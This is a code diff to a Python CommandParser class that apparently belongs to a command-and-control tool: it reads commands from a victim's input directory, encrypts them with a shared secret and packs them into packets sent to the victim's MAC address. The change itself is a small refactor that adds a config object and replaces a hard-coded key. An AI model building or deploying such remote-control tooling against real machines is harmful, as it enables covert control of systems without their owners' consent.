@@ -8,9 +8,13 @@ import time
 from threading import Thread, Timer
 # from ..utils.consts import DEFAULT_DATA_DIR, DEFAULT_CMD_FILE
 from utils.encrypt import Encrypter
+from utils.consts import SECRET
 from bundler.bundler import Bundler
 
 class CommandParser():
+
+    def __init__(self, config):
+        self.config = config
 
     def parse(self, victim_mac, victim_pkt, rel_path, command_file):
         """Parses the input file in the input directory of victim and builds packet for command
@@ -29,7 +33,7 @@ class CommandParser():
         pkts = []
         path = rel_path + '/input/' + command_file
         if os.path.isfile(path):
-            bundler = Bundler(victim_mac, victim_pkt)
+            bundler = Bundler(victim_mac, victim_pkt, self.config)
 
             # Open file contents, encrypt, and build response packet
             with open(path) as f:
@@ -37,7 +41,7 @@ class CommandParser():
 
                 for line in f:
                     line = line.replace('\n', '')
-                    parsed_commands.append(Encrypter(line, 'secret').encrypt())
+                    parsed_commands.append(Encrypter(line, SECRET).encrypt())
                     # parsed_commands.append(line)
 
                 for cmd in parsed_commands:
